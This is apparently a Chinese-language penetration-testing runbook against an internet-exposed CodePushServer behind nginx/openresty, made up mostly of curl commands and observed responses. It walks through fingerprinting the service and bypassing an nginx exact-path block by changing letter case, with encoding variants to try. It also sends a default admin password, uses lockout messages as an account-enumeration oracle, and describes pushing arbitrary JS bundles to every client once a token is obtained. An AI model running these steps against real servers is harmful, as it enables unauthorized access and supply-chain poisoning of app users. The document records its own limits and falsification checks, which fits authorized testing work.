# CodePushServer 公网暴露 + nginx 精确路径遮蔽大小写绕过

## 0. 前提
- 目标 TCP 端口可达（本例 5432，实测 CONNECT 0.07s）。端口号与产品无关，别被 5432 误导成 PostgreSQL。
- 自签证书需关闭校验：`curl -k --noproxy '*'`（--noproxy 防止本地代理把 TLS 拦掉）。
- 只读探测，间隔 ≥4s，登录只试一次。

## 1. 服务识别
```bash
curl -k --noproxy '*' -sS -D - https://TARGET:PORT/ -o body.html
```
期望：
```
HTTP/1.1 200 OK
Content-Length: 1644
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Strict-Transport-Security: max-age=15552000; includeSubDomains
...
<title>CodePushServer</title>
... react native / cordova hot update server
```
Helmet 默认头 + 该 title/文案 = CodePushServer（lisong/code-push-server 系）特征。

## 2. 管理 API 是否在跑（注意：HTTP 可能是 200，401 在 body 里）
```bash
for p in /apps /accessKeys /account /authenticated; do
  curl -k --noproxy '*' -s -o /dev/null -w "$p %{http_code} %{size_download}\n" https://TARGET:PORT$p
done
```
实测全部 `200 / 41`，body：
```json
{"status":401,"name":"UnauthorizedError"}
```
⇒ 管理接口存活、需 `Authorization: Bearer <token>`。**不要用 HTTP 状态码判鉴权结果**，这个框架把 401 写在 body。

## 3. 遮蔽判定：先分清"应用 404"和"nginx 404"
```bash
curl -k --noproxy '*' -s -D - https://TARGET:PORT/zzz_not_exist_$RANDOM   # 应用层 404
curl -k --noproxy '*' -s -D - https://TARGET:PORT/auth/login              # 疑似被遮蔽
curl -k --noproxy '*' -s -D - https://TARGET:PORT/auth/login/             # 目录形态
```
实测：
| 请求 | 结果 |
|---|---|
| `/zzz_not_exist`（应用层） | 404，body 22B：`GET /zzz_not_exist not found` |
| `/auth/login` | 404，**561B**，`Server: openresty/1.25.3.2`，`<center><h1>404 Not Found</h1></center>` |
| `/auth/login/` | **403**，561B，同一 openresty 页 |

561B 的 openresty 固定页 ≠ 应用层 22B 文本 ⇒ 是前置 nginx 主动遮蔽，路由其实存在。

## 4. 大小写绕过（核心）
```bash
curl -k --noproxy '*' -s -D - https://TARGET:PORT/auth/Login -o login.html
```
实测：`200`，2525B，真实登录页：
```html
<form class="form-signin" id="form" method="post">
  <input name="account">  <input name="password">
</form>
<script>
$.ajax({ type:'post', data:$('#form').serializeArray(),
         url:$('#form').attr('action'), ... 
         localStorage.setItem('auth', data.results.tokens) })
</script>
```
要点：表单是 **x-www-form-urlencoded 的 account/password**，POST 回当前 URL；token 落在 `data.results.tokens`。
`location` 若为 `location = /auth/login { return 404; }`（精确且大小写敏感）则 5 个字符的大写即可穿透。

其它可顺手试的变体（命中任一即成立）：
```
/auth/LOGIN  /Auth/Login  /AUTH/LOGIN
/auth/%6cogin        (编码小写，看是否先解码再匹配)
/auth/login%2f       (尾斜杠编码)
/auth/login?x=1      (仅当规则用了 $uri 之外的匹配才可能无效)
```
对照原则：变体必须回**真实登录页内容**（含 form/account 字段），不能只看 200；回 561B 固定页说明仍被遮。

## 5. 账户存在性（单发，不爆破）
```bash
curl -k --noproxy '*' -s -X POST https://TARGET:PORT/auth/Login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'account=admin&password=123456'
```
实测（1 次）：
```json
{"status":"ERROR","message":"您输入密码错误次数超过限制，帐户已经锁定"}
```
判定逻辑：
- 「密码错误次数超过限制，帐户已经锁定」→ **账户存在**，且锁定计数已触发（可能是别人打的，也可能是默认口令轮过一次）。
- 「用户不存在 / 账户不存在」同型 → 账户不存在。
- 「密码错误」→ 账户存在、可继续（但请限速、限次数）。
- 此分型差异本身就是**账户枚举 oracle**，无需爆破即可确认 admin 存在。

拿到有效口令后：`POST /auth/Login`（或 /auth/login）→ `data.results.tokens` → 带 `Authorization: Bearer` 访问 `/apps`、`/accessKeys`，再向目标 deployment 推 release 包。

## 6. 影响与升级路径
- 热更服务器 = 全体客户端代码下发面。取得任一具备发布权限的账号后，可推任意 JS bundle / AB 包 ⇒ **客户端代码执行**（等价于供应链投毒，影响全部装机用户）。
- 本轮边界（诚实记录）：管理 API 全部 401，未取得 token，未取得任何未授权数据；仅证明登录面可达 + admin 存在。

## 7. 证伪条件
- `/auth/Login` 也回 openresty 561B 固定页 → 遮蔽做了大小写合围，绕过不成立。
- POST 回「用户不存在」同型错误 → 账户存在性结论不成立。
- `/auth/login` 的 404 是 22B 应用层文本 → 该路由根本不存在，不存在"遮蔽"这回事。
